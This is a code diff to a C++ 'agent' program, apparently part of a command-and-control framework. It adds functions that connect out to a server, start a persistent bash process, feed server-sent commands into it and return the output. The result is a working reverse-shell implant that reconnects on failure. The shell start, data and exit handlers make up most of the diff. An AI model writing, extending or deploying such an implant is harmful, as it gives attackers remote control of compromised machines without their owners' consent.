@@ -5,10 +5,12 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <cstdlib>
+#include <csignal>
 #include <print>
 #include "packet.hpp"
 #include "agent.hpp"
 #include "common.hpp"
+#include "PersistentShell.hpp"
 // #include <openssl/ssl.h> // using openssl to encrypt the open socket communication
 // #include <openssl/err.h>
 
@@ -56,6 +58,21 @@ void common::inet_ntop_failed(int client_fd){
 }
 
 
+
+bool agent::send_all(int client_fd, const void *data, size_t length){
+    size_t total_bytes_sent = 0;
+    while(total_bytes_sent < length){
+        ssize_t bytes_sent = send(client_fd, static_cast<const char*>(data)+total_bytes_sent, length-total_bytes_sent, 0);
+        if(bytes_sent <= 0){
+            return false;
+        }
+        total_bytes_sent = total_bytes_sent + bytes_sent;
+    }
+    return true;
+}
+
+
+
 bool agent::recv_all(int client_fd, void *buffer, size_t length){
     size_t total_bytes_received = 0;
     while(total_bytes_received < length){
@@ -66,17 +83,55 @@ bool agent::recv_all(int client_fd, void *buffer, size_t length){
     }
     return true;
 }
-// void display_command_output(uint32_t command_length, uint32_t session_id, uint8_t heartbeat, std::string command){
-//     packet p1;
-//     p1.command_length = command_length;
-//     p1.session_id = session_id;
-//     p1.heartbeat = heartbeat + 1; //indicating agent is online
-//     p1.command = command;
-//     //std::cout << "$$$$$$$ Payload Details $$$$$$$" << std::endl;
-//     std::println("{:<20}{:<20}{:<20}{:<20}", "Session_ID", "Hearbeat", "Command_Length", "Command");
-//     std::println("{:<20}{:<20}{:<20}{:<20}", p1.session_id, p1.heartbeat, p1.command_length, p1.command);
-//     std::println();
-// }    
+
+
+
+std::vector<uint8_t> serialization(const packet &p1){ // CURRENTLY NOT USED !!! BUT WILL BE USED WHEN COMMAND SENT WILL BE IMPLEMENTED
+    size_t total_size = 
+        sizeof(uint32_t) + // message_type
+        sizeof(uint32_t) + // session_id
+        sizeof(uint32_t) + // payload_length
+        p1.payload.size(); // payload
+    
+    std::vector<uint8_t> byte_array(total_size); // memory allocated
+    uint8_t *byte_array_ptr = byte_array.data(); // in vector arrays .data() gives the address of the first element 
+    if(byte_array_ptr == nullptr){ // if memory not allocated to vector array the if condition will be true
+        common::code_exit();
+    } 
+
+    // converting the pacsession_idket_bytes (unsigned integers) to network bytes or big endian
+    uint32_t message_type = htonl(p1.message_type);
+    uint32_t session_id = htonl(p1.session_id);
+    uint32_t payload_length = htonl(p1.payload.size());
+
+    // copying this data to the vector array using memset
+    // memcpy arguments => memcpy(arg1 = addr. of where to copy data, addr. of what to copy, sizeof(the data to copy))
+    std::memcpy( // message_type copy
+        byte_array_ptr, 
+        &message_type,
+        sizeof(message_type)
+    );
+    byte_array_ptr += sizeof(message_type); // increment the vector array pointer to copy the data in correct positions
+    std::memcpy( // session_id copy
+        byte_array_ptr,
+        &session_id,
+        sizeof(session_id)
+    );
+    byte_array_ptr += sizeof(session_id);
+    std::memcpy(
+        byte_array_ptr,
+        &payload_length,
+        sizeof(payload_length)
+    );
+    byte_array_ptr += sizeof(payload_length);
+    std::memcpy(
+        byte_array_ptr,
+        p1.payload.data(),
+        p1.payload.size()
+    );
+    return byte_array;
+}
+
 
 
 packet deserialization_payload_header(const uint8_t payload_header[]){ // convert the raw bytes of payload header and store the actual data into a structure variable
@@ -126,6 +181,9 @@ std::string deserialization_payload(const uint8_t* payload, size_t payload_size)
 }
 
 
+/* handle_test_command removed — real shell execution handled by PersistentShell */
+
+
 bool agent::validate_ipaddress(std::string server_ip){
 /*    
 - Split the string by the dot (.) character.
@@ -160,6 +218,13 @@ bool agent::validate_ipaddress(std::string server_ip){
 
 
 void agent::receive_commands(std::string SERVER_IP){
+    /*
+     * A shell can disappear between is_alive() and write_input().  Ignore
+     * SIGPIPE so PersistentShell can report EPIPE to this dispatch loop
+     * instead of terminating the agent process.
+     */
+    std::signal(SIGPIPE, SIG_IGN);
+
     struct sockaddr_in server_address;
     server_address.sin_family = AF_INET; // IPv4 address
     if(inet_pton(AF_INET, SERVER_IP.c_str(), &server_address.sin_addr) <= 0){ // convert IP_address string to raw binary data in network byte order
@@ -176,33 +241,162 @@ void agent::receive_commands(std::string SERVER_IP){
         int client_fd = socket(AF_INET, SOCK_STREAM, 0);
         common::socket_check(client_fd);
         if(connect(client_fd, (struct sockaddr*)&server_address, sizeof(server_address)) == 0){
-            std::cout << "[+]connected to server" << std::endl;
+            std::cout << "[+] connected to server" << std::endl;
             while(true){
                 uint8_t payload_header[HEADER_SIZE];
                 if(!recv_all(client_fd, payload_header, HEADER_SIZE)){
-                    std::cout << "[!]failed to receive packet header" << std::endl;
+                    std::cout << "[!] failed to receive packet header" << std::endl;
                     close(client_fd);
                     return;
                 }
                 packet received_packet = deserialization_payload_header(payload_header);
                 
                 // FOR DEBUGGING PURPOSE ONLY
-                std::cout << "[+]MESSAGE_TYPE : " << received_packet.message_type << std::endl;
-                std::cout << "[+]SESSION_ID : " << received_packet.session_id << std::endl;
-                std::cout << "[+]PAYLOAD_LENGTH : " << received_packet.payload_length << std::endl;
+                std::cout << "[+] AGENT MESSAGE_TYPE: " << received_packet.message_type << std::endl;
+                std::cout << "[+] SESSION_ID: " << received_packet.session_id << std::endl;
+                std::cout << "[+] PAYLOAD_LENGTH: " << received_packet.payload_length << std::endl;
 
                 // getting the payload using the payload length
                 if(received_packet.payload_length > 0){
                     std::vector<uint8_t> payload(received_packet.payload_length);
                     if(!recv_all(client_fd, payload.data(), payload.size())){
-                        std::cout << "[!]failed to receive payload" << std::endl; // if failed to receive bytes, inner loop is exited and connection is retried from outer loop by creating a new socket
+                        std::cout << "[!] failed to receive payload" << std::endl;
                         close(client_fd);
-                        break; // when breaks new socket is created and connection is retried
+                        break;
                     }
-                    received_packet.payload = deserialization_payload(payload.data(), payload.size()); //a vector_array's.size() sends const <datatype>* pointer or address
-                    std::cout << "[+]PAYLOAD : " << received_packet.payload << std::endl;
+                    received_packet.payload = deserialization_payload(payload.data(), payload.size());
+                    std::cout << "[+] PAYLOAD: " << received_packet.payload << std::endl;
                 }
-                // THE ABOVE SECTION DEBUGGING PURPOSE ONLY
+                if(received_packet.message_type == MESSAGE_SHELL_START){
+                    std::cout << "[*] MESSAGE_SHELL_START received for session "
+                              << received_packet.session_id << std::endl;
+
+                    packet response{};
+                    response.session_id = received_packet.session_id;
+
+                    if(session.active){
+                        /* Shell already running — do not create a second one */
+                        std::cout << "[!] Shell already active for session "
+                                  << session.session_id << " — ignoring duplicate start" << std::endl;
+                        response.message_type = MESSAGE_SHELL_ACK;
+                        response.payload     = "[+] persistent shell already active";
+                    } else {
+                        /* ── Start the persistent bash child ──────────────── */
+                        if(shell_.start()){
+                            session.active     = true;
+                            session.session_id = received_packet.session_id;
+                            std::cout << "[+] PersistentShell started for session "
+                                      << session.session_id << std::endl;
+                            response.message_type = MESSAGE_SHELL_ACK;
+                            response.payload      = "[+] persistent shell started";
+                        } else {
+                            /* fork/pipe/exec failed — report error, leave session inactive */
+                            std::cout << "[-] PersistentShell::start() failed" << std::endl;
+                            response.message_type = MESSAGE_ERROR;
+                            response.payload      = "[-] failed to start shell process";
+                        }
+                    }
+
+                    response.payload_length = response.payload.size();
+                    std::vector<uint8_t> serialized = serialization(response);
+                    if(!send_all(client_fd, serialized.data(), serialized.size())){
+                        std::cout << "[!] failed to send SHELL_ACK to server" << std::endl;
+                        close(client_fd);
+                        return;
+                    }
+                    std::cout << "[+] SHELL_ACK sent to server" << std::endl;
+                }
+                else if(received_packet.message_type == MESSAGE_SHELL_DATA){
+                    std::cout << "[*] MESSAGE_SHELL_DATA received for session "
+                              << received_packet.session_id << std::endl;
+
+                    packet response{};
+                    response.session_id = received_packet.session_id;
+
+                    if(!session.active ||
+                       received_packet.session_id != session.session_id ||
+                       !shell_.is_alive()){
+                        /* Guard: no shell running */
+                        std::cout << "[!] SHELL_DATA received but no active shell" << std::endl;
+                        if(session.active && !shell_.is_alive()){
+                            shell_.stop();
+                            session.active = false;
+                            session.session_id = 0;
+                        }
+                        response.message_type = MESSAGE_ERROR;
+                        response.payload      = "[-] no active shell session";
+                    } else {
+                        std::cout << "[*] Passing command to PersistentShell: "
+                                  << received_packet.payload << std::endl;
+
+                        /* ── Write to the SAME bash process ──────────────── */
+                        if(!shell_.write_input(received_packet.payload)){
+                            /* write failed — child likely died */
+                            std::cout << "[-] write_input failed — shell may have exited" << std::endl;
+                            shell_.stop();
+                            session.active = false;
+                            session.session_id = 0;
+                            response.message_type = MESSAGE_ERROR;
+                            response.payload      = "[-] shell write failed";
+                        } else {
+                            /* ── Collect output from the SAME bash process ── */
+                            std::string output = shell_.read_available_output();
+
+                            if(output.empty()) output = "";
+
+                            /* If shell died during output collection, update state */
+                            if(!shell_.is_alive()){
+                                std::cout << "[!] Shell exited during command execution" << std::endl;
+                                shell_.stop();
+                                session.active = false;
+                                session.session_id = 0;
+                            }
+
+                            response.message_type = MESSAGE_OUTPUT;
+                            response.payload      = output;
+                            std::cout << "[+] Output collected (" << output.size()
+                                      << " bytes)" << std::endl;
+                        }
+                    }
+
+                    response.payload_length = response.payload.size();
+                    std::vector<uint8_t> serialized = serialization(response);
+                    if(!send_all(client_fd, serialized.data(), serialized.size())){
+                        std::cout << "[!] failed to send MESSAGE_OUTPUT to server" << std::endl;
+                        close(client_fd);
+                        return;
+                    }
+                    std::cout << "[+] Output sent to server" << std::endl;
+                }
+                else if(received_packet.message_type == MESSAGE_SHELL_EXIT){
+                    std::cout << "[*] MESSAGE_SHELL_EXIT received for session "
+                              << received_packet.session_id << std::endl;
+
+                    packet response{};
+                    response.session_id     = received_packet.session_id;
+
+                    if(!session.active ||
+                       received_packet.session_id != session.session_id){
+                        response.message_type = MESSAGE_ERROR;
+                        response.payload = "[-] no matching active shell session";
+                    } else {
+                        /* ── Stop the persistent bash child ────────────── */
+                        shell_.stop();      /* exit → SIGTERM → SIGKILL if needed */
+                        session.active     = false;
+                        session.session_id = 0;
+                        std::cout << "[+] PersistentShell stopped, session cleared" << std::endl;
+                        response.message_type = MESSAGE_OUTPUT;
+                        response.payload = "[+] Shell closed";
+                    }
+                    response.payload_length = response.payload.size();
+                    std::vector<uint8_t> serialized = serialization(response);
+                    if(!send_all(client_fd, serialized.data(), serialized.size())){
+                        std::cout << "[!] failed to send SHELL_EXIT response to server" << std::endl;
+                    } else {
+                        std::cout << "[+] Shell exit acknowledgement sent to server" << std::endl;
+                    }
+                    /* Socket connection remains alive for future sessions */
+                }
             }
             std::cout << "[*]attempting to reconnect..." << std::endl; // if payload receiving fails then connection is retried
         }
@@ -213,4 +407,3 @@ void agent::receive_commands(std::string SERVER_IP){
         }
     }
 }
-
